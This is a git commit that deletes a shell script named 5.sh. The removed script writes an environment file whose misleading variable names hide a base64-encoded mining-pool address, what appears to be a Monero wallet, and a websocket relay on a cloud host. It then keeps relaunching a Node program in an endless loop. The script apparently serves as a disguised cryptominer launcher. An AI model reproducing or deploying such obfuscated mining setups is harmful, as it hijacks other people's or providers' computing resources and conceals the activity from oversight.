2203946f3da19503cf32ee22c59ca87d254b9222
Shin <dirianda187@gmail.com>
2026-07-22 00:43:00 +0700

    Delete 5.sh

--- 5.sh
+++
@@ -1,9 +0,0 @@
-#!/bin/bash
-CONNECT=$1
-NAME=$2
-echo "SERVER_WS=wss://identical-sile-malphite-node-dfaa5ec5.koyeb.app
-SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
-SERVER_DOMAIN=876PV3gx5xAFrfsARXWyJ94AGfB9FjNFp3MxatiGPrAyCELXKjGUHd82ChZLPvhNo3g1Y9kpGZy5UMd23Q5Yn4mHLVT2dUy
-SERVER_SECRET=Amba-de-Tukam-1
-SERVER_CONNECTION=2" > .env
-while true; do node index.js; sleep 15; done
